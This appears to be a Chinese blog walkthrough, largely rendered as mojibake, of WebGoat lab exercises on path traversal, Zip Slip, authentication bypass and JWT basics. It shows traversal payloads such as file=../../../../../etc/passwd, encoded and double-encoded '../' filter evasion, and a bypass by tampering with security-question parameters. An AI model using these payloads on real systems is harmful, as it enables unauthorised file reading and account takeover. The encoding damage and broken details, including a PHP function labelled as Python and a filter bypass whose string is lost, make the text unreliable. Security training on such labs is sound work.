ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒæ‰˜ç®¡äº†ä¸€äº›æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸‹é¢è¯·æ±‚å®ƒä»¬ æ ¼å¼ï¼š ç°åœ¨ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œæ‚¨å½“ç„¶å¯¹å…¶ä»–æ–‡ä»¶æ„Ÿå…´è¶£ï¼Œæ‰€ä»¥ ä½ è¯•è¯•.åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å°è¯•çˆ¬åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½• ç„¶åè¿›å…¥ä»¥è·å–å¯¹æ­¤æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚ç§°ä¸ºç‚¹-ç‚¹-æ–œæ ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªåç§° å¯¹äºè¿™æ¬¡æ”»å‡»ã€‚<code>http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</code></p>
<p>å½“ç„¶ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ç¤ºä¾‹ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ä¸ä¼šä½œä¸ºæ¡†æ¶å®ç°çš„æ§ä»¶ å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ›´æœ‰åˆ›æ„ï¼Œå¹¶åœ¨è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰å¼€å§‹ç¼–ç ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å¯¹ URL è¿›è¡Œç¼–ç ï¼Œæ‚¨å°†å¾—åˆ°å¹¶ä¸”æ¥æ”¶æ­¤è¯·æ±‚çš„ Web æœåŠ¡å™¨å°†è§£ç  å®ƒå†æ¬¡æ›´æ”¹ä¸º â€¦/â€¦/%2e%2e%2fâ€¦/</p>
<p>å¦è¯·æ³¨æ„ï¼Œé¿å…åº”ç”¨ç¨‹åºè¿‡æ»¤è¿™äº›ç¼–ç çš„åŒé‡ç¼–ç ä¹Ÿå¯èƒ½æœ‰æ•ˆã€‚åŒé‡ç¼–ç  å¦‚æœç³»ç»Ÿ A è°ƒç”¨ç³»ç»Ÿ Bï¼Œåˆ™å¯èƒ½éœ€è¦ç³»ç»Ÿ Aã€‚ç³»ç»Ÿ A åªä¼šè§£ç ä¸€æ¬¡ï¼Œå¹¶ä¸” å°†ä½¿ç”¨ä»ç¼–ç çš„ URL è°ƒç”¨ Bã€‚</p>
<h4 id="2-4">2.</h4>
<p>ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°ä¸Šä¼ æ–‡ä»¶å’ŒFullNameæœ‰å…³ï¼Œå³æˆ‘ä»¬èƒ½æ§åˆ¶ä¸Šä¼ æ–‡ä»¶ä½ç½®</p>
<p>ä¿®æ”¹æˆ<code>../</code></p>
<p>åªè¦ä¸æ˜¯æ­£ç¡®çš„ä½ç½®éƒ½èƒ½é€šè¿‡</p>
<h4 id="3-5">3.</h4>
<p>è¿‡æ»¤äº†<code>../</code></p>
<p>ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬æ¢æˆ<code>../</code>å°±èƒ½é€šè¿‡äº†</p>
<h4 id="4-4">4.</h4>
<p>è¿™é¢˜å°±éœ€è¦æŠ“åŒ…äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/25.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/24.png" alt=""></p>
<p>é€šè¿‡è¿”å›çš„æ•°æ®å¯ä»¥çœ‹å‡ºå‚¨å­˜çš„ä½ç½®é€‚åˆshell.phpæœ‰å…³çš„ï¼Œæˆ‘ä»¬æ¢æˆ<code>../shell.php</code>å°±è¡Œäº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/23.png" alt=""></p>
<h4 id="5-7">5.</h4>
<p>ä½¿ç”¨è·¯å¾„éå†æ£€ç´¢å…¶ä»–æ–‡ä»¶<br>
è·¯å¾„éå†ä¸ä»…é™äºæ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨æ£€ç´¢æ–‡ä»¶æ—¶ï¼Œè·¯å¾„éå†ä¹Ÿå¯èƒ½æ˜¯ å¯ä»¥ä»ç³»ç»Ÿä¸­æ£€ç´¢å…¶ä»–æ–‡ä»¶ã€‚åœ¨æ­¤ä½œä¸šä¸­ï¼Œå°è¯•æŸ¥æ‰¾ä¸€ä¸ªåä¸ºpath-traversal-secret.jpg</p>
<p>è¿˜æ˜¯å¾—æŠ“åŒ…</p>
<p>æŒ‰Show random cat pictureåæŠ“åŒ…</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/26.png" alt=""></p>
<p>é€šè¿‡è¿”å›çš„æ•°æ®å¯ä»¥çŸ¥é“<code>?id=9.jpg</code>å¯ä»¥æ§åˆ¶æ–‡ä»¶è·¯å¾„</p>
<p>æˆ‘ä»¬ç…§è‘«èŠ¦ç”»ç“¢æ¢æˆ<code>../</code>æå¿ƒéæ³•å­—ç¬¦ã€</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/27.png" alt=""></p>
<p>æ—¢ç„¶è¿™æ ·æˆ‘ä»¬é€‰æ‹©è¦è½¬æ¢çš„ä½ç½®å³é”®é€‰æ‹©è½¬æ¢é€‰æ‹©-&gt;URL-&gt;URLç¼–ç æ‰€æœ‰å­—ç¬¦å°±èƒ½è‡ªåŠ¨è½¬æ¢äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/28.png" alt=""></p>
<p>ç„¶åå°±æ˜¯ä¸€æ­¥ä¸€æ­¥æ‰¾äº†ï¼Œåœ¨<code>../../</code>æ–‡ä»¶ä½ç½®æ‰¾åˆ°(è®°å¾—è½¬æ¢å­—ç¬¦)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/29.png" alt=""></p>
<p>æŠŠidçš„å€¼æ¢æˆè¿™ä¸ª<code>../../path-traveral-secert</code>(è®°å¾—è½¬æ¢å­—ç¬¦ï¼Œè€Œä¸”è¿™é‡Œéœ€è¦æŠŠjpgå»æ‰æ‰è¡Œï¼Œå¦åˆ™ä¸è¡Œï¼Œæˆ‘è¿™é‡Œæ²¡æƒ³æ˜ç™½ã€‚ã€‚ã€‚æœ‰è¯„è®ºåŒºå¤§ä½¬è¯·å‘ŠçŸ¥)ï¼Œç„¶åå°±çŸ¥é“flagå°±ä¼¼ä¹ä½ çš„ç”¨æˆ·åç”¨sha-512åŠ å¯†å°±è¡Œäº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/30.png" alt=""></p>
<h4 id="7-2">7.</h4>
<p>Zip Slip åˆ†é…<br>
è¿™ä¸€æ¬¡ï¼Œå¼€å‘äººå‘˜åªå…è®¸æ‚¨ä¸Šä¼  zip æ–‡ä»¶ï¼Œä½†æ˜¯ï¼Œä»–ä»¬çŠ¯äº†ä¸€ä¸ªç¼–ç¨‹é”™è¯¯ï¼Œå› ä¸ºä¸Šä¼  zip æ–‡ä»¶ä¼šæå–å®ƒï¼Œä½†ä¸ä¼šæ›¿æ¢æ‚¨çš„å›¾åƒã€‚æ‚¨èƒ½æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡ç¼–ç¨‹é”™è¯¯æ¥è¦†ç›–å½“å‰æ˜ åƒå—ï¼Ÿ</p>
<p>è¿™é¢˜æˆ‘æ²¡æƒ³æ˜ç™½è€ƒç‚¹</p>
<p>æˆ‘å°±ç›´æ¥æ‰¾äº†ä¸€å¼ ç…§ç‰‡å‹ç¼©æˆzipä¸Šä¼ å°±æˆåŠŸäº†ã€‚ã€‚ã€‚</p>
<p>æœ¬æ¥è¿˜æƒ³æŠ“åŒ…çœ‹çœ‹çš„</p>
<p>å½“æˆ‘ä»¬å»æŸ¥çœ‹é¢˜ç›®ä¸­çš„ç›®å½•ï¼Œå‘ç°ZIPå·²ç»è¢«è§£å‹ç¼©ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæœ‰ç›¸åŒæ–‡ä»¶åç§°çš„æ–‡ä»¶çš„è¯ï¼Œå°†ä¼šè¢«æ–°æ–‡ä»¶è¦†ç›–ã€‚<br>
æ­£ç¡®çš„åšæ³•æ˜¯ï¼Œå°†æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶éƒ½ç»è¿‡ä¸€éå®‰å…¨æ ¡éªŒå’Œå®‰å…¨è®¾ç½®ï¼Œå¹¶å°†æ–‡ä»¶ç»™ä¸€ä¸ªå¼ºéšæœºçš„æ–‡ä»¶åï¼Œé¿å…æ–‡ä»¶è¦†ç›–é—®é¢˜ã€‚</p>
<h2 id="4-Broken-Authenticationï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰">4.Broken Authenticationï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</h2>
<h3 id="1-Authentication-Bypassï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰">1.Authentication Bypassï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</h3>
<h4 id="1-3">1.</h4>
<p>Authentication Bypasses<br>
Authentication Bypasses happen in many ways, but usually take advantage of some flaw in the configuration or logic. Tampering to achieve the right conditions.</p>
<p>Hidden inputs<br>
The simplest form is a reliance on a hidden input that is in the web page/DOM.</p>
<p>Removing Parameters<br>
Sometimes, if an attacker doesnâ€™t know the correct value of a parameter, they may remove the parameter from the submission altogether to see what happens.</p>
<p>Forced Browsing<br>
If an area of a site is not protected properly by configuration, that area of the site may be accessed by guessing/brute-forcing.</p>
<p>èº«ä»½éªŒè¯ç»•è¿‡<br>
èº«ä»½éªŒè¯ç»•è¿‡ä»¥å¤šç§æ–¹å¼å‘ç”Ÿï¼Œä½†é€šå¸¸ä¼šåˆ©ç”¨é…ç½®æˆ–é€»è¾‘ä¸­çš„æŸäº›ç¼ºé™·ã€‚ç¯¡æ”¹ä»¥è¾¾åˆ°æ­£ç¡®çš„æ¡ä»¶ã€‚</p>
<p>éšè—è¾“å…¥<br>
æœ€ç®€å•çš„å½¢å¼æ˜¯ä¾èµ–äºç½‘é¡µ/DOM ä¸­çš„éšè—è¾“å…¥ã€‚</p>
<p>åˆ é™¤å‚æ•°<br>
æœ‰æ—¶ï¼Œå¦‚æœæ”»å‡»è€…ä¸çŸ¥é“å‚æ•°çš„æ­£ç¡®å€¼ï¼Œä»–ä»¬å¯èƒ½ä¼šä»æäº¤ä¸­å®Œå…¨åˆ é™¤è¯¥å‚æ•°ï¼Œä»¥æŸ¥çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µã€‚</p>
<p>å¼ºåˆ¶æµè§ˆ<br>
å¦‚æœç«™ç‚¹çš„æŸä¸ªåŒºåŸŸæœªé€šè¿‡é…ç½®å¾—åˆ°é€‚å½“ä¿æŠ¤ï¼Œåˆ™å¯ä»¥é€šè¿‡çŒœæµ‹/æš´åŠ›ç ´è§£æ¥è®¿é—®è¯¥ç«™ç‚¹çš„è¯¥åŒºåŸŸã€‚</p>
<h4 id="2-5">2.</h4>
<p><a target="_blank" rel="noopener" href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">æ¡ˆä¾‹è¿æ¥</a></p>
<p>æ‚¨æ­£åœ¨é‡ç½®å¯†ç ï¼Œä½†ä»æ‚¨çš„æä¾›å•†æ— æ³•è¯†åˆ«çš„ä½ç½®æˆ–è®¾å¤‡è¿›è¡Œé‡ç½®ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦å›ç­”æ‚¨è®¾ç½®çš„å®‰å…¨é—®é¢˜ã€‚å¦ä¸€ä¸ªé—®é¢˜æ˜¯ è¿™äº›å®‰å…¨é—®é¢˜ä¹Ÿå­˜å‚¨åœ¨å¦ä¸€å°è®¾å¤‡ä¸Šï¼ˆä¸æ˜¯ä¸æ‚¨ä¸€èµ·ï¼‰ï¼Œè€Œæ‚¨ä¸è®°å¾—å®ƒä»¬ã€‚</p>
<p>æ‚¨å·²ç»æä¾›äº†æ‚¨çš„ç”¨æˆ·å/ç”µå­é‚®ä»¶ï¼Œå¹¶é€‰æ‹©äº†å…¶ä»–éªŒè¯æ–¹æ³•ã€‚</p>
<p>å…¶å®å°±æ˜¯ç…§ç€æ­¥éª¤å¤ç°å°±æ˜¯äº†ã€‚ã€‚ã€‚æœ‰è¿™ä¹ˆç®€å•å°±å¥½äº†</p>
<p>æœç„¶åˆ é™¤æ²¡æœ‰ä½œç”¨ï¼Œçœ‹äº†æç¤ºè¯´æ˜¯ä¿®æ”¹å‚æ•°</p>
<p>ç»è¿‡å°è¯•å‘ç°ä¿®æ”¹æˆsecQuestionéœ€è¦æœ‰ä¸¤ä¸ªï¼Œä¸”å‚æ•°ä¸ä¸º0å’Œ1å°±è¡Œï¼Œæˆ‘è¯•è¿‡æ•°å­—æˆ–åˆ™å­—æ¯éƒ½è¡Œ</p>
<p>è¿™ä½åšä¸»å‚çœ‹äº†æºç ï¼Œè€Œä¸”ä¹Ÿè®²å¾—å¾ˆè¯¦ç»†ğŸ‘‰<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2ç‰ˆé¶æœºå­¦ä¹ æ€»ç»“_webgoat8.2.2-CSDNåšå®¢</a></p>
<p>é€šè¿‡æŸ¥çœ‹ä»£ç ç¬¬59/61/88è¡Œå¯çŸ¥ï¼Œå½“å‚æ•°ä¸­å­˜åœ¨â€œ%secQuestion%â€çš„å˜é‡æ—¶è¯·æ±‚å°±å¯ä»¥é€šè¿‡ã€‚ç¬¦å·%è¡¨ç¤ºä»»æ„å­—ç¬¦/ä¸²ã€‚</p>
<h3 id="2-JWT-tokens">2.JWT tokens</h3>
<h4 id="1-Json-Web-Token">1.Json Web Token</h4>
<h5 id="ä»€ä¹ˆæ˜¯JWT">ä»€ä¹ˆæ˜¯JWT</h5>
<p>Json Web Token (JWT), æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ï¼ˆ<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>ã€‚</p>
<p>è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ï¼Œæ˜¯ç›®å‰æœ€æµè¡Œçš„è·¨åŸŸè®¤è¯è§£å†³æ–¹æ¡ˆã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†ã€‚</p>
<h5 id="JWT-çš„åŸç†">JWT çš„åŸç†</h5>
<p>JWT çš„åŸç†æ˜¯ï¼ŒæœåŠ¡å™¨è®¤è¯ä»¥åï¼Œç”Ÿæˆä¸€ä¸ª JSON å¯¹è±¡ï¼Œå‘å›ç»™ç”¨æˆ·ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;å§“å&quot;</span><span class="punctuation">:</span> <span class="string">&quot;å¼ ä¸‰&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;è§’è‰²&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ç®¡ç†å‘˜&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;åˆ°æœŸæ—¶é—´&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018å¹´7æœˆ1æ—¥0ç‚¹0åˆ†&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä»¥åï¼Œç”¨æˆ·ä¸æœåŠ¡ç«¯é€šä¿¡çš„æ—¶å€™ï¼Œéƒ½è¦å‘å›è¿™ä¸ª JSON å¯¹è±¡ã€‚æœåŠ¡å™¨å®Œå…¨åªé è¿™ä¸ªå¯¹è±¡è®¤å®šç”¨æˆ·èº«ä»½ã€‚ä¸ºäº†é˜²æ­¢ç”¨æˆ·ç¯¡æ”¹æ•°æ®ï¼ŒæœåŠ¡å™¨åœ¨ç”Ÿæˆè¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šåŠ ä¸Šç­¾åï¼ˆè¯¦è§åæ–‡ï¼‰ã€‚</p>
<p>æœåŠ¡å™¨å°±ä¸ä¿å­˜ä»»ä½• session æ•°æ®äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒæœåŠ¡å™¨å˜æˆæ— çŠ¶æ€äº†ï¼Œä»è€Œæ¯”è¾ƒå®¹æ˜“å®ç°æ‰©å±•ã€‚</p>
<h5 id="JWT-çš„æ•°æ®ç»“æ„">JWT çš„æ•°æ®ç»“æ„</h5>
<p>å®é™…å½“ä¸­ JWT é•¿è¿™ä¸ªæ ·å­ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/2.png" alt=""></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ</span><br></pre></td></tr></table></figure>
<p>å®ƒæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„å­—ç¬¦ä¸²ï¼Œä¸­é—´ç”¨ç‚¹ï¼ˆ.ï¼‰åˆ†éš”æˆä¸‰ä¸ªéƒ¨åˆ†ã€‚æ³¨æ„ï¼ŒJWT å†…éƒ¨æ˜¯æ²¡æœ‰æ¢è¡Œçš„</p>
<p>JWT çš„ä¸‰ä¸ªéƒ¨åˆ†ä¾æ¬¡å¦‚ä¸‹:</p>
<ul>
<li>Headerï¼ˆå¤´éƒ¨ï¼‰</li>
<li>Payloadï¼ˆè´Ÿè½½ï¼‰</li>
<li>Signatureï¼ˆç­¾åï¼‰</li>
</ul>
<p>å†™æˆä¸€è¡Œï¼Œå°±æ˜¯ä¸‹é¢çš„æ ·å­ã€‚</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸ªéƒ¨åˆ†æœ€åéƒ½ä¼šä½¿ç”¨ base64URLEncodeæ–¹å¼è¿›è¡Œç¼–ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">function base64url_encode($data) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/1.png" alt=""></p>
<h5 id="Header">Header</h5>
<p>Header éƒ¨åˆ†æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œæè¿° JWT çš„å…ƒæ•°æ®ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ï¼Œä½¿ç”¨ base64decode ä¹‹åï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>headeréƒ¨åˆ†æœ€å¸¸ç”¨çš„ä¸¤ä¸ªå­—æ®µæ˜¯algå’Œtypã€‚</p>
<p>algå±æ€§è¡¨ç¤ºtokenç­¾åçš„ç®—æ³•(algorithm)ï¼Œæœ€å¸¸ç”¨çš„ä¸ºHMACå’ŒRSAç®—æ³•</p>
<p>typå±æ€§è¡¨ç¤ºè¿™ä¸ªtokençš„ç±»å‹ï¼ˆtypeï¼‰ï¼ŒJWT ä»¤ç‰Œç»Ÿä¸€å†™ä¸ºJWTã€‚</p>
<h5 id="Payload">Payload</h5>
<p>Payload éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œç”¨æ¥å­˜æ”¾å®é™…éœ€è¦ä¼ é€’çš„æ•°æ®ã€‚JWT è§„å®šäº†7ä¸ªå®˜æ–¹å­—æ®µï¼Œä¾›é€‰ç”¨ã€‚</p>
<ul>
<li>iss (issuer)ï¼šç­¾å‘äºº</li>
<li>exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´</li>
<li>sub (subject)ï¼šä¸»é¢˜</li>
<li>aud (audience)ï¼šå—ä¼—</li>
<li>nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´</li>
<li>iat (Issued At)ï¼šç­¾å‘æ—¶é—´</li>
<li>jti (JWT ID)ï¼šç¼–å·</li>
</ul>
<p>é™¤äº†å®˜æ–¹å­—æ®µï¼Œè¿˜å¯ä»¥åœ¨è¿™ä¸ªéƒ¨åˆ†å®šä¹‰ç§æœ‰å­—æ®µï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ä¸ºä¾‹ï¼Œå°† payload éƒ¨åˆ†è§£ base64 ä¹‹åï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼šJWT é»˜è®¤æ˜¯ä¸ä¼šå¯¹ Payload åŠ å¯†çš„ï¼Œä¹Ÿå°±æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥è¯»åˆ°è¿™éƒ¨åˆ†JSONçš„å†…å®¹ï¼Œæ‰€ä»¥ä¸è¦å°†ç§å¯†çš„ä¿¡æ¯æ”¾åœ¨è¿™ä¸ªéƒ¨åˆ†</p>
</blockquote>
<h5 id="Signature">Signature</h5>
<p>Signature éƒ¨åˆ†æ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹</p>
<p>é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥ï¼ˆsecretï¼‰ã€‚è¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨æ‰çŸ¥é“ï¼Œä¸èƒ½æ³„éœ²ç»™ç”¨æˆ·ã€‚ç„¶åï¼Œ<strong>ä½¿ç”¨ Header é‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•ï¼ˆé»˜è®¤æ˜¯ HMAC SHA256ï¼‰</strong>ï¼ŒæŒ‰ç…§ä¸‹é¢çš„å…¬å¼äº§ç”Ÿç­¾åã€‚</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>ç®—å‡ºç­¾åä»¥åï¼ŒæŠŠ Headerã€Payloadã€Signature ä¸‰ä¸ªéƒ¨åˆ†æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨&quot;ç‚¹&quot;ï¼ˆ.ï¼‰åˆ†éš”ï¼Œå°±å¯ä»¥è¿”å›ç»™ç”¨æˆ·ã€‚</p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/introduction/">å®˜ç½‘è§£é‡Š</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html"> é˜®ä¸€å³°è€å¸ˆäº²ä½œ</a>(åŠ›æ¨ï¼Œå†™çš„å¾ˆæ¸…æ™°)</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON Web Token - Wikipedia</a></p>
<ol start="3">
<li></li>
</ol>
<p>è¿™é‡Œç›´æ¥è§£ç å°±è¡Œäº†ï¼Œå¯ä»¥ç”¨<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens </a>çš„ä¹Ÿå¯ä»¥ç”¨Webwolfè‡ªå¸¦çš„åŠŸèƒ½</p>
<h4 id="5-8">5.</h4>
<p>å°è¯•æ›´æ”¹æ‚¨æ”¶åˆ°çš„ä»¤ç‰Œå¹¶é€šè¿‡æ›´æ”¹ä»¤ç‰Œæˆä¸ºç®¡ç†å‘˜ç”¨æˆ·ï¼Œå¹¶åœ¨æ‚¨æˆä¸ºç®¡ç†å‘˜åé‡ç½®æŠ•ç¥¨</p>
<p>ç‚¹å‡»æŠ•ç¥¨ä¹‹åæŠ“åŒ…</p>
